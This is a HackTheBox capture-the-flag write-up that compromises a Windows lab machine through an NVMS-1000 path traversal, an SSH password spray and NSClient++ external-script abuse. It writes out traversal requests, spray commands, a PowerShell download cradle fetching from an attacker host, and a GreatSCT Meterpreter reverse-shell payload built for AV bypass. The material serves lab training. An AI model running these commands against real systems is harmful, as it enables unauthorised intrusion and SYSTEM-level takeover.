
## Overview

**Platform:** HackTheBox **Operating System:** Windows **Difficulty:** Easy **Initial Access:** Anonymous FTP reveals a note pointing to a password file on a user's desktop → NVMS-1000 LFI (CVE-2019-20085) reads that file → password spray on SSH → foothold as Nadine **Privilege Escalation:** NSClient++ password recovered from local `.ini` file → SSH tunnel to bypass IP whitelist → external script created in NSClient++ web UI → NSCP service restarted → SYSTEM execution **Final Access:** NT AUTHORITY\SYSTEM

### Key Techniques

- Full port + service enumeration
- Anonymous FTP enumeration and file download
- Cross-referencing FTP notes to identify a specific credential file location
- NVMS-1000 LFI (Burp Repeater, path traversal to `C:\Users\Nathan\Desktop\Passwords.txt`)
- Password spray against SSH using recovered list + enumerated usernames
- NSClient++ password recovery from local `.ini` file and via CLI flag
- Service ACL enumeration (Get-ServiceACL, PS download cradle)
- SSH local port forward to bypass NSClient's localhost-only whitelist
- NSClient++ external script feature abuse for SYSTEM code execution
- NSCP service stop/start to load newly created script entry
- GreatSCT / regsvcs.exe DLL payload for AV-bypass Meterpreter delivery

---

# Attack Path

```text
nmap -p- --min-rate=1000
        ↓
FTP (anonymous), SSH (22), HTTP/80 (NVMS-1000), HTTPS/8443 (NSClient++)
        ↓
Anonymous FTP — Download Nadine/Confidential.txt + Nathan/Notes to do.txt
        ↓
Confidential.txt: Password file exists on Nathan's Desktop
        ↓
Notes.txt: Confirms NVMS and NSClient++ are installed, tasks partially complete
        ↓
Port 80 — NVMS-1000 login — default creds fail
        ↓
CVE-2019-20085: LFI via path traversal in GET request
        ↓
Verify LFI → read C:\Windows\win.ini
        ↓
Exploit LFI → read C:\Users\Nathan\Desktop\Passwords.txt
        ↓
7 passwords recovered
        ↓
Password spray vs SSH (Nadine, Nathan, Administrator)
        ↓
nadine:L1k3B1gBut7s@W0rk — SSH access
        ↓
whoami /priv — low-privileged user
        ↓
C:\Program Files\NSClient++\nsclient.ini — NSClient password + localhost whitelist
        ↓
Verify NSClient version (0.5.2.35 — known vulnerable to feature abuse privesc)
        ↓
Check NSCP service permissions — CanStop=True, CanStart=True for Nadine
        ↓
SSH Tunnel: ssh -L 8443:127.0.0.1:8443 nadine@<target>
        ↓
Login to NSClient++ at https://localhost:8443
        ↓
Settings → External Scripts → Add new script (points to C:\Temp\pwn.bat)
        ↓
Create pwn.bat (runs GreatSCT DLL via regsvcs.exe)
        ↓
sc.exe stop nscp / sc.exe start nscp
        ↓
Run external script from NSClient++ console
        ↓
Meterpreter as NT AUTHORITY\SYSTEM
```

---

# 1. Nmap Enumeration

```bash
ports=$(nmap -p- --min-rate=1000 -T4 <target> | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -sC -sV <target>
```

```text
21/tcp    ftp    — Anonymous login allowed
22/tcp    ssh
80/tcp    http   — NVMS-1000 login page
8443/tcp  https  — NSClient++ login page
```

Two separate web applications on two different ports — both worth hitting with default creds immediately. The anonymous FTP is the high-value immediate find.

---

# 2. FTP Enumeration (Anonymous)

```bash
ftp <target>
# Username: anonymous
# Password: (blank or anonymous)
passive
ls
```

> [!tip] Recognition Pattern When enumerating FTP manually, **passive mode** (`passive`) resolves connectivity issues caused by firewalls blocking inbound data connections — worth enabling by default before starting to browse.

Directory structure: `Users/Nadine/` and `Users/Nathan/` — two files of interest:

```bash
cd Users
get "Nadine\\Confidential.txt"
get "Nathan\\Notes to do.txt"
```

**Confidential.txt** (from Nadine):

```
Nathan, I left your Passwords.txt file on your Desktop. Please remove this once you have edited it yourself...
```

A direct pointer to a specific file path on the target: `C:\Users\Nathan\Desktop\Passwords.txt`.

**Notes to do.txt** (from Nathan):

```
1) Change the password for NVMS - Complete
2) Lock down the NSClient Access - Complete
3) Upload the passwords           ← still pending
4) Remove public access to NVMS  ← still pending
5) Place the secret files in SharePoint
```

Tasks 3 and 4 being incomplete are immediately significant — NVMS still has public access, and the password file is likely still sitting on Nathan's desktop where Nadine left it.

> [!tip] Recognition Pattern TODO/notes files found on accessible shares or FTP often reveal the current state of security hardening — items marked incomplete are a direct roadmap to what hasn't been secured yet. Always read these files fully, not just skim for passwords.

---

# 3. Foothold — NVMS-1000 LFI (CVE-2019-20085)

Port 80 runs **NVMS-1000** (Network Video Management Software). Default credentials (`admin:123456` and variants) don't work. Searching Exploit-DB for "NVMS" returns a Local File Inclusion exploit: **CVE-2019-20085**.

## Verifying the LFI

Intercept any request to port 80 in Burp Suite, send to Repeater, and substitute the GET path with a path traversal:

```
GET /../../../../../../../../../../../../windows/win.ini HTTP/1.1
```

The `win.ini` file contents are returned — LFI confirmed.

> [!tip] Key Principle `C:\Windows\win.ini` is one of the safest universal LFI verification targets on Windows — it exists on every Windows installation and is readable by all users, meaning a successful read confirms the vulnerability without depending on the exact path of anything specific to this host. Always use it to confirm before attempting target-specific file reads.

## Exploiting the LFI to read the password file

```
GET /../../../../../../../../../../../../Users/Nathan/Desktop/Passwords.txt HTTP/1.1
```

Response contains:

```
1nsp3ctTh3Way2Mars!
Th3r34r3To0M4nyTrait0r5!
B3WithM30r4ga1n5tMe
L1k3B1gBut7s@W0rk
0nly7h3y0unGWi11F0l10w
IfH3s4b0Utg0t0H1sH0me
Gr4etN3w5w17hMySk1Pa5$
```

> [!tip] Recognition Pattern A note on an accessible FTP share pointing to a specific file, combined with a confirmed LFI on the same host, is a direct two-step chain: the FTP note hands you the target path, the LFI hands you the file's contents. This kind of cross-service information chaining is common on AD/Windows boxes.

---

# 4. Password Spray — SSH

```bash
# passwords.txt — the 7 recovered passwords
# users.txt — Nadine, Nathan, administrator (from FTP directory listing)

hydra -L users.txt -P passwords.txt ssh://<target>
# or
nxc ssh <target> -u users.txt -p passwords.txt
```

Valid pair found: `nadine:L1k3B1gBut7s@W0rk`

```bash
ssh nadine@<target>
whoami /priv
```

`nadine` is a low-privileged user — no unusual privileges, so further enumeration needed.

```bash
cat C:\Users\Nadine\Desktop\user.txt
```

---

# 5. Privilege Escalation Enumeration

## NSClient++ password recovery

Non-default directory found during filesystem enumeration:

```
C:\Program Files\NSClient++\
```

The `.ini` configuration file contains the password directly in plaintext, and also reveals that the whitelist is set to **localhost only** — the web UI on port 8443 is intentionally inaccessible from the network.

```powershell
type "C:\Program Files\NSClient++\nsclient.ini"
```

Retrieve the password via CLI as an alternative:

```powershell
cmd /c "C:\Program Files\NSClient++\nscp.exe" web -- password --display
```

> [!tip] Recognition Pattern Configuration files for monitoring agents, server management tools, and similar software regularly store their own web-UI credentials in plaintext `.ini` / `.conf` files. Always check `C:\Program Files\` for non-default installed tools and read their config files — monitoring/management software is especially likely to contain readable credentials.

## NSClient++ version and known vulnerability

```powershell
cmd /c "C:\Program Files\NSClient++\nscp.exe" version
```

Version **0.5.2.35** — the version specifically documented in public research as vulnerable to a privilege escalation via the **external scripts feature** (not a software bug — an intentional admin feature that executes arbitrary scripts as SYSTEM).

## Checking NSCP service permissions

```powershell
# Download and run Get-ServiceACL.ps1 via in-memory PS download cradle
$h=New-Object -ComObject Msxml2.XMLHTTP
$h.open('GET','http://<attacker_ip>/Get-ServiceACL.ps1',$false)
$h.send()
iex $h.responseText

"nscp" | Get-ServiceAcl | select -ExpandProperty Access
```

Direct access to the Service Control Manager is denied from the shell context, but basic service properties are still readable:

```powershell
Get-Service nscp | fl *
```

`CanStop: True` and `CanStart: True` — Nadine has been granted permission to stop and start the NSCP service specifically, even as a low-privileged user. This is the final prerequisite for the exploit.

> [!tip] Key Principle A user having specific stop/start rights on a service (without general service control rights) is a deliberately-granted, scoped permission — often granted by admins who want a specific operator to be able to restart a monitoring service without giving full admin rights. This exact configuration is what makes the NSClient++ privesc here work — the ability to restart the service is what loads the newly-created malicious script.

---

# 6. Privilege Escalation — NSClient++ External Script Abuse

## SSH tunnel to bypass the localhost whitelist

Since NSClient++ only accepts connections from `127.0.0.1`:

```bash
ssh -L 8443:127.0.0.1:8443 nadine@<target>
```

This forwards local port 8443 on the attacker machine to port 8443 on the target's loopback — any request to `https://localhost:8443` on the attacker machine now reaches NSClient++ as if it were coming from the target's own loopback.

> [!tip] Recognition Pattern An SSH local port forward (`-L local_port:target_host:target_port`) is the clean, reliable bypass for any service that whitelists only `127.0.0.1` — once an SSH session is established as any user, this is available regardless of the user's privilege level. It costs a second terminal window and nothing else.

## Creating the malicious script

Log in at `https://localhost:8443` using the recovered NSClient++ password.

Navigate to **Settings → External Scripts → Scripts → + Add new**:

- **Section:** `/settings/external scripts/scripts/shell`
- **Key:** `<script_name>`
- **Value:** `C:\Temp\pwn.bat`

Save and **Changes → Save Configuration** to write the new entry to disk.

## Preparing the payload

Generate a DLL payload with GreatSCT (a framework for bypassing AV/application whitelisting using trusted Windows binaries like `regsvcs.exe`):

```bash
git clone https://github.com/GreatSCT/GreatSCT
cd GreatSCT
sudo ./GreatSCT.py --ip <attacker_ip> --port 1234 -t bypass -p regsvcs/meterpreter/rev_tcp.py -o serv
```

Host the DLL and download it to the target:

```bash
cd /usr/share/greatsct-output/compiled/
sudo python3 -m http.server 80
```

```powershell
# On target
wget http://<attacker_ip>/serv.dll -O C:\Temp\serv.dll
```

Create `pwn.bat` — the batch file the external script points at:

```powershell
cmd /c "echo C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe C:\Temp\serv.dll > C:\Temp\pwn.bat"
```

## Restarting the service to load the new script

```powershell
sc.exe stop nscp
sc.exe start nscp
```

## Triggering the script

In the NSClient++ web console (**Queries → Run Script**), run the newly created script entry.

```bash
msfconsole -r /usr/share/greatsct-output/handlers/serv.rc
```

Meterpreter session received as **NT AUTHORITY\SYSTEM**.

> [!note] Stability Note The first connection sometimes drops immediately — run the script a second time if this happens; a stable session is typically received on the second attempt.

```powershell
cat C:\Users\Administrator\Desktop\root.txt
```

---

# Recognition Patterns

|Observation|Investigate|
|---|---|
|Anonymous FTP available|Always download everything — notes, documents, and any text file, not just credentials|
|TODO/notes file on an accessible share|Incomplete items are a direct map to what hasn't been secured yet|
|LFI confirmed on one service, + note pointing to a specific file path|Chain them directly — the note gives you the path, the LFI gives you the file|
|Password list found (multiple candidates, no clear "which user")|Spray across every enumerated username on every available auth service|
|Management/monitoring agent installed in `C:\Program Files\`|Read its `.ini`/`.conf` files — plaintext credentials are common|
|A service's config shows `localhost` whitelist for its web UI|SSH local port forward (`-L`) is the reliable bypass once any SSH session exists|
|Low-priv user has `CanStop: True` + `CanStart: True` on a service|That service restart capability is a privesc primitive if the service or its config is exploitable|

---

# Key Lessons

> [!tip] Anonymous FTP Content Can Chain Into Other Services A note file on FTP pointing to a specific file path, combined with an LFI on another service on the same box, forms a complete credential-extraction chain with no guesswork involved — the FTP enumeration is what makes the LFI actionable.

> [!tip] `win.ini` Is the Universal Windows LFI Verification Target It exists on all Windows versions and is readable by all users — always use it to confirm a Windows LFI before attempting target-specific file reads.

> [!tip] Incomplete Tasks on a Notes File Are a Roadmap NVMS still having public access, and Nathan's passwords file still sitting on his desktop, were both directly called out as incomplete in the notes file. Reading these in full before deciding where to focus effort is more reliable than guessing.

> [!tip] SSH Local Port Forwards Bypass Localhost Whitelists Any service that restricts access to `127.0.0.1` can be reached via SSH tunnel from a host that can SSH into the target — this is a standard, always-available technique that requires only an existing SSH session.

> [!tip] A Scoped Service Restart Permission Is a Privesc Primitive When a low-priv user can stop and start a specific service that runs as SYSTEM, and that service loads config/scripts on restart, the service-restart permission effectively becomes a SYSTEM code-execution primitive — the key prerequisite for the NSClient++ external script technique.